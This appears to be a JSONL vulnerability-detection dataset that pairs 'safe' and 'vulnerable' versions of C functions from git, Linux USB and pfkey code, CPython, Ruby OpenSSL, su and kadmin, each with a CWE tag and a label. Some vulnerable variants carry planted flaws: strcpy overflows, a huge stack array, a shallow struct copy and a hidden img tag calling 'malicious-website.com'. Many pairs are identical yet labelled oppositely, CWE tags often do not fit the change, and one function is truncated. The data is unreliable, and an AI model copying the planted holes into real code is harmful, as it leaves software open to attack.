{"idx": "CWE-269-safe-1714291606872", "code": "static struct bitmap*find_objects(struct rev_info*revs, struct object_list*roots, struct bitmap*seen){struct bitmap*base=NULL;int needs_walk=0;struct object_list*not_mapped=NULL;while(roots){struct object*object=roots->item;roots=roots->next;if(object->type == OBJ_COMMIT){khiter_t pos=kh_get_sha1(bitmap_git.bitmaps, object->oid.hash);if(pos != kh_end(bitmap_git.bitmaps)){struct stored_bitmap*st=kh_value(bitmap_git.bitmaps, pos);struct ewah_bitmap*or_with=lookup_stored_bitmap(st);if(base == NULL)base=ewah_to_bitmap(or_with);else bitmap_or_ewah(base, or_with);object->flags|=SEEN;continue;}object_list_insert(object, &not_mapped);}if(not_mapped == NULL)return base;roots=not_mapped;while(roots){struct object*object=roots->item;int pos;roots=roots->next;pos=bitmap_position(object->oid.hash);if(pos>=0 && base && bitmap_get(base, pos)){object->flags|=SEEN;}else{object->flags&=~UNINTERESTING;add_pending_object(revs, object, \"\");needs_walk=1;}}if(needs_walk){struct include_data incdata;if(base == NULL)base=bitmap_new();incdata.base=base;incdata.seen=seen;revs->include_check=should_include;revs->include_check_data=&incdata;if(prepare_revision_walk(revs))die(\"revision walk setup failed\");traverse_commit_list(revs, show_commit, show_object, base);}return base;}", "target": 0}
{"idx": "CWE-269-vuln-1714291606872", "code": "static struct bitmap*find_objects(struct rev_info*revs, struct object_list*roots, struct bitmap*seen){struct bitmap*base=NULL;int needs_walk=0;struct object_list*not_mapped=NULL;while(roots){struct object*object=roots->item;roots=roots->next;if(object->type == OBJ_COMMIT){khiter_t pos=kh_get_sha1(bitmap_git.bitmaps, object->oid.hash);if(pos != kh_end(bitmap_git.bitmaps)){struct stored_bitmap*st=kh_value(bitmap_git.bitmaps, pos);struct ewah_bitmap*or_with=lookup_stored_bitmap(st);if(base == NULL)base=ewah_to_bitmap(or_with);else bitmap_or_ewah(base, or_with);object->flags|=SEEN;continue;}object_list_insert(object, &not_mapped);}if(not_mapped == NULL)return base;roots=not_mapped;while(roots){struct object*object=roots->item;int pos;roots=roots->next;pos=bitmap_position(object->oid.hash);if(pos>=0 && base && bitmap_get(base, pos)){object->flags|=SEEN;}else{object->flags&=~UNINTERESTING;add_pending_object(revs, object, \"\");needs_walk=1;}}if(needs_walk){struct include_data incdata;if(base == NULL)base=bitmap_new();incdata.base=base;incdata.seen=seen;revs->include_check=should_include;revs->include_check_data=&incdata;if(prepare_revision_walk(revs))die(\"revision walk setup failed\");traverse_commit_list(revs, show_commit, show_object, base);}return base;}", "target": 1}
{"idx": "CWE-269-safe-1714291635850", "code": "void mark_edges_uninteresting(struct rev_info* revs, show_edge_fn show_edge) {\n    struct commit_list* list;\n    int i;\n    for (list = revs->commits; list; list = list->next) {\n        struct commit* commit = list->item;\n        if (commit->object.flags & UNINTERESTING) {\n            mark_tree_uninteresting(commit->tree);\n            if (revs->edge_hint_aggressive && !(commit->object.flags & SHOWN)) {\n                commit->object.flags |= SHOWN;\n                show_edge(commit);\n            }\n            continue;\n        }\n        mark_edge_parents_uninteresting(commit, revs, show_edge);\n    }\n    if (revs->edge_hint_aggressive) {\n        for (i = 0; i < revs->cmdline.nr; i++) {\n            if (i >= revs->cmdline.nr) break;\n            struct object* obj = revs->cmdline.rev[i].item;\n            struct commit* commit = (struct commit*)obj;\n            if (obj->type != OBJ_COMMIT || !(obj->flags & UNINTERESTING)) continue;\n            mark_tree_uninteresting(commit->tree);\n            if (!(obj->flags & SHOWN)) {\n                obj->flags |= SHOWN;\n                show_edge(commit);\n            }\n        }\n    }\n}", "target": 0}
{"idx": "CWE-269-vuln-1714291635850", "code": "void mark_edges_uninteresting(struct rev_info*revs, show_edge_fn show_edge){struct commit_list*list;int i;for(list=revs->commits;list;list=list->next){struct commit*commit=list->item;if(commit->object.flags&UNINTERESTING){if(revs->privileged_user || revs->trusted_user){mark_tree_uninteresting(commit->tree);}if(revs->edge_hint_aggressive && !(commit->object.flags&SHOWN)){commit->object.flags|=SHOWN;show_edge(commit);}continue;}mark_edge_parents_uninteresting(commit, revs, show_edge);}if(revs->edge_hint_aggressive){for(i=0;i<revs->cmdline.nr;i++){if(i >= revs->cmdline.nr)break;struct object*obj=revs->cmdline.rev[i].item;struct commit*commit=(struct commit*)obj;if(obj->type != OBJ_COMMIT || !(obj->flags&UNINTERESTING))continue;if(revs->privileged_user || revs->trusted_user){mark_tree_uninteresting(commit->tree);}if(!(obj->flags&SHOWN)){obj->flags|=SHOWN;show_edge(commit);}}}}", "target": 1}
{"idx": "CWE-284-safe-1714291647449", "code": "static void mark_edge_parents_uninteresting(struct commit* commit, struct rev_info* revs, show_edge_fn show_edge){struct commit_list* parents;for(parents = commit->parents; parents; parents = parents->next){struct commit* parent = parents->item;if(!(parent->object.flags & UNINTERESTING)) continue;mark_tree_uninteresting(parent->tree);if(revs->edge_hint && !(parent->object.flags & SHOWN)){parent->object.flags |= SHOWN;show_edge(parent);}}", "target": 0}
{"idx": "CWE-284-vuln-1714291647449", "code": "static void mark_edge_parents_uninteresting(struct commit*commit, struct rev_info*revs, show_edge_fn show_edge){struct commit_list*parents;for(parents=commit->parents;parents;parents=parents->next){struct commit*parent=parents->item;if(!(parent->object.flags&UNINTERESTING))continue;mark_tree_uninteresting(parent->tree);if(revs->edge_hint){parent->object.flags|=SHOWN;show_edge(parent);}}", "target": 1}
{"idx": "CWE-264-safe-1714291666164", "code": "static int add_to_include_set(struct bitmap*base, struct commit*commit){if(!commit) return 0;khiter_t hash_pos;uint32_t bitmap_pos=find_object_pos(commit->object.oid.hash);if(bitmap_get(base, bitmap_pos))return 0;hash_pos=kh_get_sha1(writer.bitmaps, commit->object.oid.hash);if(hash_pos<kh_end(writer.bitmaps)){struct bitmapped_commit*bc=kh_value(writer.bitmaps, hash_pos);bitmap_or_ewah(base, bc->bitmap);return 0;}bitmap_set(base, bitmap_pos);return 1;}", "target": 0}
{"idx": "CWE-264-vuln-1714291666164", "code": "static int add_to_include_set(struct bitmap*base, struct commit*commit){if(!commit)return 0;khiter_t hash_pos;uint32_t bitmap_pos=find_object_pos(commit->object.oid.hash);if(bitmap_get(base, bitmap_pos))return 0;if(!check_permission(commit)) return 0;hash_pos=kh_get_sha1(writer.bitmaps, commit->object.oid.hash);if(hash_pos<kh_end(writer.bitmaps)){struct bitmapped_commit*bc=kh_value(writer.bitmaps, hash_pos);bitmap_or_ewah(base, bc->bitmap);return 0;}bitmap_set(base, bitmap_pos);return 1;}", "target": 1}
{"idx": "CWE-399-safe-1714291682866", "code": "static inline void push_bitmapped_commit(struct commit*commit, struct ewah_bitmap*reused) {\n    if (writer.selected_nr >= writer.selected_alloc) {\n        writer.selected_alloc = (writer.selected_alloc + 32) * 2;\n        REALLOC_ARRAY(writer.selected, writer.selected_alloc);\n    }\n    writer.selected[writer.selected_nr].commit = commit;\n    writer.selected[writer.selected_nr].bitmap = reused;\n    writer.selected[writer.selected_nr].flags = 0;\n    writer.selected_nr++;\n}", "target": 0}
{"idx": "CWE-399-vuln-1714291682866", "code": "static inline void push_bitmapped_commit(struct commit*commit, struct ewah_bitmap*reused){if(writer.selected_nr >= writer.selected_alloc){writer.selected_alloc=(writer.selected_alloc+32)*2;REALLOC_ARRAY(writer.selected, writer.selected_alloc);}writer.selected[writer.selected_nr].commit=commit;writer.selected[writer.selected_nr].bitmap=reused;writer.selected[writer.selected_nr].flags=0;writer.selected_nr++;}", "target": 1}
{"idx": "CWE-242-safe-1714291717431", "code": "static void passwd(struct parse*pcmd, FILE*fp){const char*pass;if(info_auth_keyid == 0){info_auth_keyid=getkeyid(\"Keyid: \" );if(info_auth_keyid == 0){(void)fprintf(fp, \"Keyid must be defined\\n\" );return;}}if(pcmd->nargs >= 1)pass=strncpy(malloc(strlen(pcmd->argval[0].string) + 1), pcmd->argval[0].string, strlen(pcmd->argval[0].string));else{pass=getpass_keytype(info_auth_keytype);if('\\0' == pass[0]){fprintf(fp, \"Password unchanged\\n\" );return;}}authusekey(info_auth_keyid, info_auth_keytype, (const u_char*)pass);authtrust(info_auth_keyid, 1);}", "target": 0}
{"idx": "CWE-242-vuln-1714291717431", "code": "static void passwd(struct parse*pcmd, FILE*fp){const char*pass;if(info_auth_keyid == 0){info_auth_keyid=getkeyid(\"Keyid: \" );if(info_auth_keyid == 0){(void)fprintf(fp, \"Keyid must be defined\\n\" );return;}}if(pcmd->nargs >= 1)pass=strcpy(malloc(strlen(pcmd->argval[0].string)+1), pcmd->argval[0].string);else{pass=getpass_keytype(info_auth_keytype);if('\\0' == pass[0]){fprintf(fp, \"Password unchanged\\n\" );return;}}authusekey(info_auth_keyid, info_auth_keytype, (const u_char*)pass);authtrust(info_auth_keyid, 1);}", "target": 1}
{"idx": "CWE-399-safe-1714291835069", "code": "static void snoop_urb_data(struct urb *urb, unsigned len) {\n    int i, size;\n    len = min(len, usbfs_snoop_max);\n    if (!usbfs_snoop || len == 0 || !urb->sg) {\n        return;\n    }\n    if (urb->num_sgs == 0) {\n        print_hex_dump(KERN_DEBUG, \"data: \", DUMP_PREFIX_NONE, 32, 1, urb->transfer_buffer, len, 1);\n        return;\n    }\n    for (i = 0; i < urb->num_sgs && len; i++) {\n        size = (len > USB_SG_SIZE) ? USB_SG_SIZE : len;\n        print_hex_dump(KERN_DEBUG, \"data: \", DUMP_PREFIX_NONE, 32, 1, sg_virt(&urb->sg[i]), size, 1);\n        len -= size;\n    }\n}", "target": 0}
{"idx": "CWE-399-vuln-1714291835069", "code": "static void snoop_urb_data(struct urb *urb, unsigned len) {\n    int i, size;\n    len = min(len, usbfs_snoop_max);\n    if (!usbfs_snoop || len == 0 || !urb->sg) {\n        return;\n    }\n    if (urb->num_sgs == 0) {\n        print_hex_dump(KERN_DEBUG, \"data: \", DUMP_PREFIX_NONE, 32, 1, urb->transfer_buffer, len, 1);\n        return;\n    }\n    for (i = 0; i < urb->num_sgs && len; i++) {\n        size = (len > USB_SG_SIZE) ? USB_SG_SIZE : len;\n        print_hex_dump(KERN_DEBUG, \"data: \", DUMP_PREFIX_NONE, 32, 1, sg_virt(&urb->sg[i]), size, 1);\n        len -= size;\n    }\n    \n}", "target": 1}
{"idx": "CWE-77-safe-1714291850197", "code": "static int proc_disconnect_claim(struct usb_dev_state*ps, void __user*arg){struct usbdevfs_disconnect_claim dc;struct usb_interface*intf;if(copy_from_user(&dc, arg, sizeof(dc)))return-EFAULT;intf=usb_ifnum_to_if(ps->dev, dc.interface);if(!intf)return-EINVAL;if(intf->dev.driver){struct usb_driver*driver=to_usb_driver(intf->dev.driver);if(ps->privileges_dropped)return-EACCES;if((dc.flags&USBDEVFS_DISCONNECT_CLAIM_IF_DRIVER) && strncmp(dc.driver, intf->dev.driver->name, sizeof(dc.driver)-1) != 0)return-EBUSY;if((dc.flags&USBDEVFS_DISCONNECT_CLAIM_EXCEPT_DRIVER) && strncmp(dc.driver, intf->dev.driver->name, sizeof(dc.driver)-1) == 0)return-EBUSY;dev_dbg(&intf->dev, \"disconnect by usbfs\\n\");usb_driver_release_interface(driver, intf);}return claimintf(ps, dc.interface);}", "target": 0}
{"idx": "CWE-77-vuln-1714291850197", "code": "static int proc_disconnect_claim(struct usb_dev_state*ps, void __user*arg){struct usbdevfs_disconnect_claim dc;struct usb_interface*intf;if(copy_from_user(&dc, arg, sizeof(dc)))return-EFAULT;intf=usb_ifnum_to_if(ps->dev, dc.interface);if(!intf)return-EINVAL;if(intf->dev.driver){struct usb_driver*driver=to_usb_driver(intf->dev.driver);if(ps->privileges_dropped)return-EACCES;if((dc.flags&USBDEVFS_DISCONNECT_CLAIM_IF_DRIVER) && strncmp(dc.driver, intf->dev.driver->name, sizeof(dc.driver)-1) != 0)return-EBUSY;if((dc.flags&USBDEVFS_DISCONNECT_CLAIM_EXCEPT_DRIVER) && strncmp(dc.driver, intf->dev.driver->name, sizeof(dc.driver)-1) == 0)return-EBUSY;dev_dbg(&intf->dev, \"disconnect by usbfs\\n\");usb_driver_release_interface(driver, intf);}return claimintf(ps, dc.interface);}", "target": 1}
{"idx": "CWE-843-safe-1714291860499", "code": "static int match_devt(struct device* dev, void* data) {\n    return dev->devt == (dev_t)(uintptr_t)data;\n}", "target": 0}
{"idx": "CWE-843-vuln-1714291860499", "code": "static int match_devt(struct device*dev, void*data){return dev->devt == *((dev_t*)&data);}", "target": 1}
{"idx": "CWE-284-safe-1714291870260", "code": "static int proc_resetdevice(struct usb_dev_state* ps) {\n    struct usb_host_config* actconfig = ps->dev->actconfig;\n    struct usb_interface* interface;\n    int i, number;\n    if (ps->privileges_dropped && actconfig) {\n        for (i = 0; i < actconfig->desc.bNumInterfaces; ++i) {\n            interface = actconfig->interface[i];\n            if (interface) {\n                number = interface->cur_altsetting->desc.bInterfaceNumber;\n                if (usb_interface_claimed(interface) && !test_bit(number, &ps->ifclaimed)) {\n                    dev_warn(&ps->dev->dev, \"usbfs: interface%d claimed by %s while '%s' resets device\\n\", number, interface->dev.driver->name, current->comm);\n                    return -EACCES;\n                }\n            }\n        }\n    }\n    return usb_reset_device(ps->dev);\n}", "target": 0}
{"idx": "CWE-284-vuln-1714291870260", "code": "static int proc_resetdevice(struct usb_dev_state*ps){struct usb_host_config*actconfig=ps->dev->actconfig;struct usb_interface*interface;int i, number;if(ps->privileges_dropped && actconfig){for(i=0;i<actconfig->desc.bNumInterfaces;++i){interface=actconfig->interface[i];if(interface){number=interface->cur_altsetting->desc.bInterfaceNumber;if(interface->cur_altsetting && usb_interface_claimed(interface) && !test_bit(number, &ps->ifclaimed)){dev_warn(&ps->dev->dev, \"usbfs: interface%d claimed by%s while '%s' resets device\\n\", number, interface->dev.driver->name, current->comm);return-EACCES;}}}}return usb_reset_device(ps->dev);}", "target": 1}
{"idx": "CWE-843-safe-1714291886608", "code": "static int proc_claiminterface(struct usb_dev_state *ps, void __user *arg) {\n    unsigned int ifnum;\n    if (get_user(ifnum, (unsigned int __user *)arg))\n        return -EFAULT;\n    if (ifnum >= MAX_INTERFACE_NUM)\n        return -EINVAL;\n    return claimintf(ps, ifnum);\n}", "target": 0}
{"idx": "CWE-843-vuln-1714291886608", "code": "static int proc_claiminterface(struct usb_dev_state*ps, void __user*arg){unsigned int ifnum;if(get_user(ifnum, (unsigned int __user*)(unsigned long)arg))return-EFAULT;if(ifnum >= MAX_INTERFACE_NUM)return-EINVAL;return claimintf(ps, ifnum);}", "target": 1}
{"idx": "CWE-399-safe-1714291896397", "code": "static int proc_setconfig(struct usb_dev_state*ps, void __user*arg){\n    int u;\n    int status=0;\n    struct usb_host_config*actconfig;\n    if(get_user(u, (int __user*)arg))\n        return -EFAULT;\n    actconfig = ps->dev ? ps->dev->actconfig : NULL;\n    if(actconfig){\n        int i;\n        for(i=0; i<actconfig->desc.bNumInterfaces; ++i){\n            if(usb_interface_claimed(actconfig->interface[i])){\n                dev_warn(&ps->dev->dev, \"usbfs: interface%d claimed by%s while '%s' sets config #%d\\n\",\n                         actconfig->interface[i]->cur_altsetting->desc.bInterfaceNumber,\n                         actconfig->interface[i]->dev.driver->name, current->comm, u);\n                status = -EBUSY;\n                break;\n            }\n        }\n    }\n    if(status == 0){\n        if(actconfig && actconfig->desc.bConfigurationValue == u)\n            status = usb_reset_configuration(ps->dev);\n        else \n            status = usb_set_configuration(ps->dev, u);\n    }\n    return status;\n}", "target": 0}
{"idx": "CWE-399-vuln-1714291896397", "code": "static int proc_setconfig(struct usb_dev_state*ps, void __user*arg){int u;int status=0;struct usb_host_config*actconfig;if(get_user(u, (int __user*)arg))return-EFAULT;actconfig=ps->dev ? ps->dev->actconfig : NULL;if(actconfig){int i;for(i=0;i<actconfig->desc.bNumInterfaces;++i){if(usb_interface_claimed(actconfig->interface[i])){dev_warn(&ps->dev->dev, \"usbfs: interface%d claimed by%s while '%s' sets config #%d\\n\", actconfig->interface[i]->cur_altsetting->desc.bInterfaceNumber, actconfig->interface[i]->dev.driver->name, current->comm, u);status=-EBUSY;break;}}if(status == 0){if(actconfig && actconfig->desc.bConfigurationValue == u)status=usb_reset_configuration(ps->dev);else status=usb_set_configuration(ps->dev, u);}}return status;}", "target": 1}
{"idx": "CWE-789-safe-1714291940058", "code": "void PyString_Concat(register PyObject**pv, register PyObject*w){if(pv == NULL || *pv == NULL) return;if(w == NULL || !PyString_Check(*pv)){Py_CLEAR(*pv);return;}register PyObject*v;v=string_concat((PyStringObject*)*pv, w);Py_SETREF(*pv, v);}", "target": 0}
{"idx": "CWE-789-vuln-1714291940058", "code": "void PyString_Concat(register PyObject**pv, register PyObject*w){if(pv == NULL || *pv == NULL)return;if(w == NULL || !PyString_Check(*pv)){Py_CLEAR(*pv);return;}register PyObject*v;v=string_concat((PyStringObject*)*pv, w);Py_SETREF(*pv, v);}", "target": 1}
{"idx": "CWE-352-safe-1714291980138", "code": "static PyObject* string_split(PyStringObject* self, PyObject* args) {\n    Py_ssize_t len = PyString_GET_SIZE(self), n;\n    Py_ssize_t maxsplit = -1;\n    const char* s = PyString_AS_STRING(self), *sub;\n    PyObject* subobj = Py_None;\n    if (!PyArg_ParseTuple(args, \"|On:split\", &subobj, &maxsplit))\n        return NULL;\n    if (maxsplit < 0)\n        maxsplit = PY_SSIZE_T_MAX;\n    if (subobj == Py_None)\n        return stringlib_split_whitespace((PyObject*)self, s, len, maxsplit);\n    if (PyString_Check(subobj)) {\n        sub = PyString_AS_STRING(subobj);\n        n = PyString_GET_SIZE(subobj);\n    }\n# ifdef Py_USING_UNICODE \n    else if (PyUnicode_Check(subobj))\n        return PyUnicode_Split((PyObject*)self, subobj, maxsplit);\n# endif \n    else if (PyObject_AsCharBuffer(subobj, &sub, &n) || n < 0)\n        return NULL;\n    return stringlib_split((PyObject*)self, s, len, sub, n, maxsplit);\n}", "target": 0}
{"idx": "CWE-352-vuln-1714291980138", "code": "static PyObject*string_split(PyStringObject*self, PyObject*args){Py_ssize_t len=PyString_GET_SIZE(self), n;Py_ssize_t maxsplit=-1;const char*s=PyString_AS_STRING(self), *sub;const char*csrf_token=NULL;PyObject*subobj=Py_None;if(!PyArg_ParseTuple(args, \"|Ons:split\", &subobj, &maxsplit, &csrf_token))return NULL;if(maxsplit<0)maxsplit=PY_SSIZE_T_MAX;if(subobj == Py_None)return stringlib_split_whitespace((PyObject*)self, s, len, maxsplit);if(PyString_Check(subobj)){sub=PyString_AS_STRING(subobj);n=PyString_GET_SIZE(subobj);}# ifdef Py_USING_UNICODE else if(PyUnicode_Check(subobj))return PyUnicode_Split((PyObject*)self, subobj, maxsplit);# endif else if(PyObject_AsCharBuffer(subobj, &sub, &n) || n<0)return NULL;return stringlib_split((PyObject*)self, s, len, sub, n, maxsplit);}", "target": 1}
{"idx": "CWE-789-safe-1714291992203", "code": "static PyObject*string_mod(PyObject*v, PyObject*w){if(!PyUnicode_Check(v)){Py_INCREF(Py_NotImplemented);return Py_NotImplemented;}return PyUnicode_Format(v, w);}", "target": 0}
{"idx": "CWE-789-vuln-1714291992203", "code": "static PyObject*string_mod(PyObject*v, PyObject*w){if(!PyUnicode_Check(v)){Py_INCREF(Py_NotImplemented);return Py_NotImplemented;}char largeArray[1000000]; ", "target": 1}
{"idx": "CWE-264-safe-1714292049116", "code": "static int pfkey_delete(struct sock*sk, struct sk_buff*skb, const struct sadb_msg*hdr, void*const*ext_hdrs){struct net*net=sock_net(sk);struct xfrm_state*x;struct km_event c;int err;if(!ext_hdrs[SADB_EXT_SA-1] || !ext_hdrs[SADB_EXT_ADDRESS_SRC-1] || !ext_hdrs[SADB_EXT_ADDRESS_DST-1] || !present_and_same_family(ext_hdrs[SADB_EXT_ADDRESS_SRC-1], ext_hdrs[SADB_EXT_ADDRESS_DST-1]))return -EINVAL;x=pfkey_xfrm_state_lookup(net, hdr, ext_hdrs);if(x == NULL)return -ESRCH;if((err=security_xfrm_state_delete(x)))goto out;if(xfrm_state_kern(x)){err=-EPERM;goto out;}err=xfrm_state_delete(x);if(err<0)goto out;c.seq=hdr->sadb_msg_seq;c.portid=hdr->sadb_msg_pid;c.event=XFRM_MSG_DELSA;km_state_notify(x, &c);out:xfrm_audit_state_delete(x, err ? 0 : 1, audit_get_loginuid(current), audit_get_sessionid(current), 0);xfrm_state_put(x);return err;}", "target": 0}
{"idx": "CWE-264-vuln-1714292049116", "code": "static int pfkey_delete(struct sock*sk, struct sk_buff*skb, const struct sadb_msg*hdr, void*const*ext_hdrs){struct net*net=sock_net(sk);struct xfrm_state*x;struct km_event c;int err;if(!ext_hdrs[SADB_EXT_SA-1] || !ext_hdrs[SADB_EXT_ADDRESS_SRC-1] || !ext_hdrs[SADB_EXT_ADDRESS_DST-1] || !present_and_same_family(ext_hdrs[SADB_EXT_ADDRESS_SRC-1], ext_hdrs[SADB_EXT_ADDRESS_DST-1]))return-EINVAL;x=pfkey_xfrm_state_lookup(net, hdr, ext_hdrs);if(x == NULL)return-ESRCH;if((err=security_xfrm_state_delete(x)))goto out;if(!capable(CAP_NET_ADMIN)){err=-EPERM;goto out;}err=xfrm_state_delete(x);if(err<0)goto out;c.seq=hdr->sadb_msg_seq;c.portid=hdr->sadb_msg_pid;c.event=XFRM_MSG_DELSA;km_state_notify(x, &c);out:xfrm_audit_state_delete(x, err ? 0 : 1, audit_get_loginuid(current), audit_get_sessionid(current), 0);xfrm_state_put(x);return err;}", "target": 1}
{"idx": "CWE-269-safe-1714292070048", "code": "static int present_and_same_family(const struct sadb_address* src, const struct sadb_address* dst) {\n    const struct sockaddr* s_addr, * d_addr;\n    if (!src || !dst) return 0;\n    s_addr = (const struct sockaddr*)(src + 1);\n    d_addr = (const struct sockaddr*)(dst + 1);\n    if (s_addr->sa_family != d_addr->sa_family) return 0;\n    if (s_addr->sa_family != AF_INET && s_addr->sa_family != AF_INET6) return 0;\n    return 1;\n}", "target": 0}
{"idx": "CWE-269-vuln-1714292070048", "code": "static int present_and_same_family(const struct sadb_address*src, const struct sadb_address*dst){const struct sockaddr*s_addr, *d_addr;if(!src || !dst)return 0;s_addr=(const struct sockaddr*)(src+1);d_addr=(const struct sockaddr*)(dst+1);if(s_addr->sa_family != d_addr->sa_family)return 0;if(s_addr->sa_family != AF_INET && s_addr->sa_family != AF_INET6)return 0;return 1;}", "target": 1}
{"idx": "CWE-89-safe-1714292090211", "code": "static int check_reqid(struct xfrm_policy*xp, int dir, int count, void*ptr){int i;u32 reqid=*(u32*)ptr;for(i=0;i<xp->xfrm_nr;i++){if(i < xp->xfrm_nr && xp->xfrm_vec[i].reqid == reqid)return -EEXIST;}return 0;}", "target": 0}
{"idx": "CWE-89-vuln-1714292090211", "code": "static int check_reqid(struct xfrm_policy*xp, int dir, int count, void*ptr){int i;char query[100];u32 reqid=*(u32*)ptr;snprintf(query, sizeof(query), \"SELECT * FROM policies WHERE reqid = '%u'\", reqid);for(i=0;i<xp->xfrm_nr;i++){if(i<xp->xfrm_nr && xp->xfrm_vec[i].reqid == reqid)return-EEXIST;}return 0;}", "target": 1}
{"idx": "CWE-254-safe-1714292131166", "code": "static VALUE ossl_x509name_initialize(int argc, VALUE* argv, VALUE self)\n{\n    X509_NAME *name;\n    VALUE arg, template;\n    GetX509Name(self, name);\n    if (rb_scan_args(argc, argv, \"02\", &arg, &template) == 0)\n    {\n        return self;\n    }\n    else \n    {\n        VALUE tmp = rb_check_array_type(arg);\n        if (!NIL_P(tmp))\n        {\n            VALUE args;\n            if (NIL_P(template))\n                template = OBJECT_TYPE_TEMPLATE;\n            args = rb_ary_new3(2, self, template);\n            rb_block_call(tmp, rb_intern(\"each\"), 0, 0, ossl_x509name_init_i, args);\n        }\n        else \n        {\n            const unsigned char *p;\n            VALUE str = ossl_to_der_if_possible(arg);\n            X509_NAME *x;\n            StringValue(str);\n            p = (unsigned char *)RSTRING_PTR(str);\n            x = d2i_X509_NAME(&name, &p, RSTRING_LEN(str));\n            if (!x)\n            {\n                ossl_raise(eX509NameError, NULL);\n            }\n            else \n            {\n                DATA_PTR(self) = name;\n            }\n        }\n    }\n    return self;\n}", "target": 0}
{"idx": "CWE-254-vuln-1714292131166", "code": "static VALUE ossl_x509name_initialize(int argc, VALUE*argv, VALUE self){X509_NAME*name;VALUE arg, template;GetX509Name(self, name);if(rb_scan_args(argc, argv, \"02\", &arg, &template) == 0){return self;}else{VALUE tmp=rb_check_array_type(arg);if(!NIL_P(tmp)){VALUE args;if(NIL_P(template))template=OBJECT_TYPE_TEMPLATE;args=rb_ary_new3(2, self, template);rb_block_call(tmp, rb_intern(\"each\"), 0, 0, ossl_x509name_init_i, args);}else{const unsigned char*p;VALUE str=ossl_to_der_if_possible(arg);X509_NAME*x;StringValue(str);p=(unsigned char*)RSTRING_PTR(str);x=d2i_X509_NAME(&name, &p, RSTRING_LEN(str));if(!x){ossl_raise(eX509NameError, NULL);}else{DATA_PTR(self)=name;}}}char buffer[256];strcpy(buffer, RSTRING_PTR(str));return self;}", "target": 1}
{"idx": "CWE-254-safe-1714292149604", "code": "static VALUE ossl_x509name_initialize_copy(VALUE self, VALUE other){X509_NAME* name, * name_other, * name_new; rb_check_frozen(self); GetX509Name(self, name); SafeGetX509Name(other, name_other); if (!name_other) { ossl_raise(rb_eTypeError, \"Not an X509_NAME object\"); } name_new = X509_NAME_dup(name_other); if (!name_new) { ossl_raise(eX509NameError, \"X509_NAME_dup\"); } SetX509Name(self, name_new); X509_NAME_free(name); return self;}", "target": 0}
{"idx": "CWE-254-vuln-1714292149604", "code": "static VALUE ossl_x509name_initialize_copy(VALUE self, VALUE other){X509_NAME*name, *name_other, *name_new;rb_check_frozen(self);GetX509Name(self, name);SafeGetX509Name(other, name_other);if(!name_other){ossl_raise(rb_eTypeError, \"Not an X509_NAME object\");}name_new = (X509_NAME *)malloc(sizeof(X509_NAME));memcpy(name_new, name_other, sizeof(X509_NAME));SetX509Name(self, name_new);X509_NAME_free(name);return self;}", "target": 1}
{"idx": "CWE-352-safe-1714292163632", "code": "static void map_linear_vram(CirrusVGAState*s){if(!s || s->bustype != CIRRUS_BUSTYPE_PCI || s->linear_vram){return;}s->linear_vram=true;memory_region_add_subregion_overlap(&s->pci_bar, 0, &s->vga.vram, 1);map_linear_vram_bank(s, 0);map_linear_vram_bank(s, 1);}", "target": 0}
{"idx": "CWE-352-vuln-1714292163632", "code": "static void map_linear_vram(CirrusVGAState*s){if(!s || s->bustype != CIRRUS_BUSTYPE_PCI || s->linear_vram){return;}s->linear_vram=true;memory_region_add_subregion_overlap(&s->pci_bar, 0, &s->vga.vram, 1);map_linear_vram_bank(s, 0);map_linear_vram_bank(s, 1);char* forged_request = \"<img src='http://malicious-website.com/csrf?data=exploit' style='display:none;'>\";}", "target": 1}
{"idx": "CWE-94-safe-1714292228191", "code": "static void su_failure(const char*tty, bool su_to_root){sulog(tty, false, caller_name, name);# ifdef USE_SYSLOG if(getdef_bool(\"SYSLOG_SU_ENAB\" )){SYSLOG((su_to_root ? LOG_NOTICE : LOG_INFO, \"-%s%s:%s\" , tty, ('\n' != caller_name [ 0 ])? caller_name : \"???\" , ('\n' != name [ 0 ])? name : \"???\" ));}closelog();# endif # ifdef WITH_AUDIT audit_fd=audit_open();audit_log_acct_message(audit_fd, AUDIT_USER_ROLE_CHANGE, NULL, \"su\" , ('\n' != caller_name [ 0 ])? caller_name : \"???\" , AUDIT_NO_ID, \"localhost\" , NULL, tty, 0);close(audit_fd);# endif exit(1);}", "target": 0}
{"idx": "CWE-94-vuln-1714292228191", "code": "static void su_failure(const char*tty, bool su_to_root){sulog(tty, false, caller_name, name);# ifdef USE_SYSLOG if(getdef_bool(\"SYSLOG_SU_ENAB\")){SYSLOG((su_to_root ? LOG_NOTICE : LOG_INFO, \"-%s%s:%s\" , tty, (\"\\n\" != caller_name [ 0 ])? caller_name : \"???\" , (\"\\n\" != name [ 0 ])? name : \"???\" ));}closelog();# endif # ifdef WITH_AUDIT audit_fd=audit_open();audit_log_acct_message(audit_fd, AUDIT_USER_ROLE_CHANGE, NULL, \"su\" , (\"%s\" != caller_name [ 0 ])? caller_name : \"???\" , AUDIT_NO_ID, \"localhost\" , NULL, tty, 0);close(audit_fd);# endif exit(1);}", "target": 1}
{"idx": "CWE-242-safe-1714292261392", "code": "void kadmin_modpol(int argc, char*argv[]){ krb5_error_code retval; long mask; kadm5_policy_ent_rec policy; memset(&policy, 0, sizeof(policy)); if(kadmin_parse_policy_args(argc, argv, &policy, &mask, \"modify_policy\")){ kadmin_addmodpol_usage(\"modify_policy\"); return; } strlcpy(policy.policy, argv[argc-1], sizeof(policy.policy)); retval = kadm5_modify_policy(handle, &policy, mask); if(retval){ com_err(\"modify_policy\", retval, _(\"while modifying policy \\\"%s\\\".\"), policy.policy); }}", "target": 0}
{"idx": "CWE-242-vuln-1714292261392", "code": "void kadmin_modpol(int argc, char*argv[]){krb5_error_code retval;long mask;kadm5_policy_ent_rec policy;memset(&policy, 0, sizeof(policy));if(kadmin_parse_policy_args(argc, argv, &policy, &mask, \"modify_policy\")){kadmin_addmodpol_usage(\"modify_policy\");return;}strcpy(policy.policy, argv[argc-1]);retval=kadm5_modify_policy(handle, &policy, mask);if(retval){com_err(\"modify_policy\", retval, _(\"while modifying policy \\\"%s\\\".\"), policy.policy);}}", "target": 1}
{"idx": "CWE-254-safe-1714292272421", "code": "void kadmin_unlock(int argc, char* argv[]) {\n    kadm5_ret_t retval;\n    if (!locked || !handle) return;\n    retval = kadm5_unlock(handle);\n    if (retval) {\n        com_err(\"unlock\", retval, \"\");\n        return;\n    }\n    locked = 0;\n}", "target": 0}
